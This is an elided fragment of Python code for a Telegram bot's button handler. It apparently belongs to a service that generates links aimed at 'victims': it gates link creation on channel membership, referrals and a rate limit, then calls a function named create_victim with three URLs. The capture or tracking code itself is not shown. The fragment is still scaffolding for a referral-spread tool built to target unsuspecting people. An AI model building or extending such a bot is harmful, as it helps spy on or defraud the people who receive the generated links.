...
def cb(c):
    ...
    try:
        if d == 'm':
            bot.edit_message_text("Menu", uid, mid, reply_markup=mk_kb())
            bot.answer_callback_query(c.id)
            return
        elif d == 'c':
            u = db.get_user(uid)
            if not u:
                bot.edit_message_text('Use /start first', uid, mid, reply_markup=bk())
                bot.answer_callback_query(c.id)
                return
            ...
            bot.edit_message_text(txt, uid, mid, reply_markup=bk())
            bot.answer_callback_query(c.id)
            return
        elif d == 'a':
            if not check_ch(uid):
                bot.edit_message_text(f'Join {CHANNEL_USERNAME} first!', uid, mid, reply_markup=bk())
                bot.answer_callback_query(c.id)
                return
            if db.is_rate_limited(uid):
                bot.edit_message_text('Rate limit! Max 5/hour', uid, mid, reply_markup=bk())
                bot.answer_callback_query(c.id)
                return
            av = db.get_available_links(uid)
            if av <= 0:
                ...
                bot.edit_message_text(f'No links left! Need {max(1,need)} more referral(s)', uid, mid, reply_markup=mk_kb())
                bot.answer_callback_query(c.id)
                return
            code = gen_code()
            ...
            if not db.create_victim(uid, code, cu, lu, au):
                bot.edit_message_text('Failed to create', uid, mid, reply_markup=bk())
                bot.answer_callback_query(c.id)
                return
            ...
            kb.add(telebot.types.InlineKeyboardButton('Menu', callback_data='m'))
            bot.edit_message_text(txt, uid, mid, reply_markup=kb)
            bot.answer_callback_query(c.id)
            return
        elif d == 'b':
            page = 0
            ...
            if total == 0:
                bot.edit_message_text('No links yet', uid, mid, reply_markup=mk_kb())
                bot.answer_callback_query(c.id)
                return
        ...
        try:
            bot.answer_callback_query(c.id, f"Error: {str(e)[:30]}", show_alert=True)
        except: pass
